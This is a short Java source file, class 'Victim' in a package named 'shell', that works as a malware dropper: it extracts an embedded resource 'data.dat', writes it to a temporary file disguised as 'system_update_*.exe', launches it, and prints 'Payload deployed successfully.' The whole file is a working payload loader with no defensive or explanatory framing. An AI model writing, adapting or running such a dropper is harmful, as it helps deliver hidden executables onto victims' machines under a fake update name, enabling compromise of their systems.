package shell;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class Victim {
    public static void main(String[] args) {
        try {
            System.out.println("[*] Extracting payload...");

            InputStream is = Victim.class.getResourceAsStream("/data.dat");
            if (is == null) {
                System.out.println("[!] data.dat not found in resources!");
                return;
            }

            File tempExe = File.createTempFile("system_update_", ".exe");
            tempExe.deleteOnExit();

            try (FileOutputStream fos = new FileOutputStream(tempExe)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
            }

            System.out.println("[*] Launching: " + tempExe.getAbsolutePath());
            new ProcessBuilder(tempExe.getAbsolutePath()).start();

            System.out.println("[+] Payload deployed successfully.");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
